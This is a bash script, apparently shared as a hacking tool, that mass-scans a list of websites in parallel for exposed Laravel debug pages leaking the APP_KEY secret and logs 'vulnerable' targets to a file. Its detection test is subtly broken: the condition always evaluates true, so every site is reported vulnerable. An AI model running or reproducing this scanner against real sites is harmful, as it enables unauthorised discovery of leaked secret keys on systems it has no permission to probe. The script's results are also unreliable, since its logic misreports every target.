#!/bin/bash
# Mass Laravel Debug Checker
# Created By Im-Hanzou
# Using GNU Parallel
# Usage: bash file.sh list.txt thread 

yellow='\033[0;33m'
cat << "EOF"
  _                                _ 
 | |    __ _  _ _  __ _ __ __ ___ | |
 | |__ / _` || '_|/ _` |\ V // -_)| |
 |____|\__,_||_|  \__,_| \_/ \___||_|
                                     
EOF
printf "${yellow}Mass Laravel Debug Checker\nGithub : im-hanzou\nUsage: bash file.sh list.txt thread\nExample: bash laravel-debugcheck.sh list.txt 50\n\n\n"

exploit(){	
classic='\033[0m'
red='\e[41m'
green='\e[42m'
target=$1
thread=$2

if [[ $(curl --silent --connect-timeout 10 --max-time 10 --insecure $target -d '[]') =~ '<td>APP_KEY</td>' || 'APP_KEY' ]]; 
then
    printf "${green}[ Vuln ]${classic} => [ $target | Laravel Debug ] \n";
    printf "$target" >> vuln.txt
    else
    printf "${red}[ Not Vuln ]${classic} => $target \n";
    echo "$target" >> bad.txt
fi
}

export -f exploit
parallel -j $2 exploit :::: $1 

printf "\033[0;36mCheck Vuln : vuln.txt\n";
printf "\033[0;36mBad Site : bad.txt\n";
